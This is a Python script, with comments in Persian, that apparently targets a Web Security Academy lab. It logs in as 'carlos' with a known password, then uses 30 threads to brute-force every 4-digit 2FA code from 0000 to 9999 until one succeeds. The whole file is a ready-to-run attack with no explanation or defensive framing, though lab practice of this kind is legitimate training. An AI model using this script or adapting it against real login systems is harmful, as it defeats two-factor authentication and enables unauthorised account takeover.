import requests
import time
import itertools
from threading import Thread, Lock

# ================== تنظیمات ==================
BASE_URL = "https://0aef007d03d2635b8032351d00780006.web-security-academy.net"   #target first url 

LOGIN_URL = f"{BASE_URL}/login"
TWO_FA_URL = f"{BASE_URL}/login2"      # معمولاً /login2 هست

USERNAME = "carlos"
PASSWORD = "123qwe"       # پسورد درست رو بذار

# speed options 
THREADS = 30               # تعداد thread (10 تا 30 خوبه، بیشتر ممکنه بلاک بشه)
DELAY = 0.1                # تأخیر بین درخواست‌ها (کم کن اگر لب اجازه میده)
# =============================================

session = requests.Session()
found = False
lock = Lock()

def login():
    """first login"""
    data = {"username": USERNAME, "password": PASSWORD}
    r = session.post(LOGIN_URL, data=data, allow_redirects=False)
    if r.status_code == 302:
        print("[+] first login successful")
        return True
    else:
        print("[-] first login unsuccessful")
        return False

def try_2fa(code):
    global found
    if found:
        return
    
    data = {"2fa-code": code}
    try:
        r = session.post(TWO_FA_URL, data=data, allow_redirects=False, timeout=10)
        
        if r.status_code == 302 or "log in" in r.text.lower() or "success" in r.text.lower():
            with lock:
                if not found:
                    print(f"\n🎉 right code found : {code}")
                    found = True
        elif "incorrect" in r.text.lower() or "invalid" in r.text.lower():
            print(f"[-] {code} ", end="", flush=True)
        else:
            print(f"[?] {code} - Status: {r.status_code}")
            
    except:
        pass

# ================== اجرا ==================
if not login():
    exit()

print("start 2fa brute_force (0000 to 9999)...\n")

# تولید همه کدهای ۴ رقمی
codes = [f"{i:04d}" for i in range(10000)]

# استفاده از Thread برای سرعت بیشتر
threads = []
for code in codes:
    if found:
        break
    t = Thread(target=try_2fa, args=(code,))
    threads.append(t)
    t.start()
    
    # کنترل تعداد thread فعال
    while len([t for t in threads if t.is_alive()]) >= THREADS:
        time.sleep(0.1)

# منتظر تمام شدن threadها
for t in threads:
    t.join()

if not found:
    print("\n 2fa code not found.")
else:
    print("login with 2fa code has successful!")
